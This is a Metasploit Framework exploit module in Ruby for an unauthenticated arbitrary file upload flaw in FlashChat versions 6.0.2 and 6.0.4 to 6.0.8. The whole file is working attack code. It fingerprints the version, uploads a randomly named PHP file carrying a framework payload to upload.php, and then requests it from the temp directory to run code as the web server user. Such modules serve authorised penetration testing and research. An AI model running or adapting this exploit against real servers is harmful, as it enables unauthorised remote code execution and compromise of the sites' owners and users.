# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "FlashChat Arbitrary File Upload",
      &#039;Description&#039;    => %q{
        This module exploits a file upload vulnerability found in FlashChat
        versions 6.0.2 and 6.0.4 to 6.0.8. Attackers can abuse the upload
        feature in order to upload malicious PHP files without authentication
        which results in arbitrary remote code execution as the web server user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;x-hayben21&#039;, # Discovery and PoC
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039;  # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;28709&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;   => "\x00"
        },
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Targets&#039;        =>
        [
          # Tested on FlashChat version 6.0.8
          [ &#039;Generic (PHP Payload)&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Oct 04 2013",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to FlashChat&#039;, &#039;/chat/&#039;])
        ], self.class)
  end

  #
  # Checks if target is running FlashChat versions 6.0.2, 6.0.4 to 6.0.8
  #
  def check
    uri = normalize_uri(target_uri.path, &#039;&#039;)
    res = send_request_raw({&#039;uri&#039; => uri})

    if not res
      print_error("#{peer} - Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    version = res.body.scan(/<title>FlashChat v([\d\.]+)/).flatten[0] || &#039;&#039;

    if version.empty?
      return Exploit::CheckCode::Unknown
    end

    print_status("#{peer} - Version found: #{version}")

    if version =~ /6\.0\.(2|4|5|6|7|8)/
      return Exploit::CheckCode::Vulnerable
    elsif version <= "6.0.8"
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end

  end


  #
  # Uploads our malicious file
  # Stolen from havalite_upload_exec.rb
  #
  def upload(base)
    fname = "#{rand_text_alphanumeric(rand(10)+6)}.php"
    php   = "<?php #{payload.encoded} ?>"
    data = Rex::MIME::Message.new
    data.add_part(php, "application/octet-stream", nil, "form-data; name=\"file\"; filename=\"#{fname}\"")
    post_data = data.to_s.gsub(/^\r\n--_Part_/, &#039;--_Part_&#039;)

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(base, &#039;upload.php&#039;),
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;   => post_data
    })

    if not res
      fail_with(Failure::Unknown, "#{peer} - Request timed out while uploading")
    elsif res.code.to_i == 404
      fail_with(Failure::NotFound, "#{peer} - No upload.php found")
    elsif res.code.to_i == 500
      fail_with(Failure::Unknown, "#{peer} - Unable to write #{fname}")
    end

    return fname
  end


  #
  # Executes our uploaded malicious file
  # Stolen from havalite_upload_exec.rb
  #
  def exec(base, payload_fname)
    res = send_request_raw({
      &#039;uri&#039; => normalize_uri(base, &#039;temp&#039;, payload_fname)
    })

    if res and res.code == 404
      fail_with(Failure::NotFound, "#{peer} - Not found: #{payload_fname}")
    end
  end

  def exploit
    base = target_uri.path

    # upload
    print_status("#{peer} - Uploading malicious file...")
    fname = upload(base)

    # register the file to clean
    register_files_for_cleanup(fname)

    # exec
    print_status("#{peer} - Executing #{fname}...")
    exec(base, fname)
  end
end

